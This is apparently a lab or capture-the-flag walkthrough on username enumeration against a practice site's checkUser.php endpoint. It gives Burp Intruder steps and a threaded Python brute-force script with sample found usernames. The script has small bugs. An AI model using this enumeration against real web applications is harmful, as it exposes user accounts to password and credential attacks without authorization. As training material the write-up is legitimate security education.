# Challenge #5 - Foo Hosting 2

## Objectives

- The web application is vulnerable to "username enumeration," and your goal is to find as much as you can usernames.
- You have to find at least four usernames: one that begins with the G, one with the H, with the P and with the Z

## Hints

- Recommended tools
  - Burps suite
  - Web Browser
- User Enumeration

## What you will learn

- How to enumerate the usernames of a web application
- How to configure advanced options of Burp Suite
- How to use Burp Intruder to perform dictionary attacks

## Steps


With burp enable, register any user on the system. 

```
http://4.challenge.auth.site/register.php
```

Go to burp history and search the request "checkUser.php". The request send the parameter "username" and receives 1 if this username is available and 0 if is not.

```
POST /checkUser.php HTTP/1.1
Host: 4.challenge.auth.site

username=example
```

Send the request to burp intruder.

On positions, clear all positions and then add only username. Keep the attack type as snipper.

```
username=§example§
```

In payloads, go to payload options and click in load. Select one username wordlist, if you don't have one, download one from the link below.

```
https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt
```

In options go to grep extract and them click in add. Select the text "1" and ok.

Start the attack.

**If you're using burp community, this option can take to long. The option below can be a lot quicker.**

## Python way

```
#!/usr/bin/env python3
import requests
import sys
import threading

if len(sys.argv) > 2:
    print('Usage brute-force.py wordlist')

wl = sys.argv[1]
usr = ''

f = open(wl, 'r')

def username_test(name):
    while True:
        usr = f.readline().strip()

        url = 'http://4.challenge.auth.site/checkUser.php'
        data = {'username': usr}

        x = requests.post(url, data=data)

        if x.text == '0':
            print("Found username:", usr)

if __name__ == "__main__":
    for x in range(0,10):
        t = threading.Thread(target=username_test, args=(1,))
        t.start()
```

And run with the command below.

```
python brute-force.py /usr/share/seclists/Usernames/Names/names.txt
Found username: alma
Found username: anne
Found username: ashely
Found username: cassandra
Found username: cassidy
```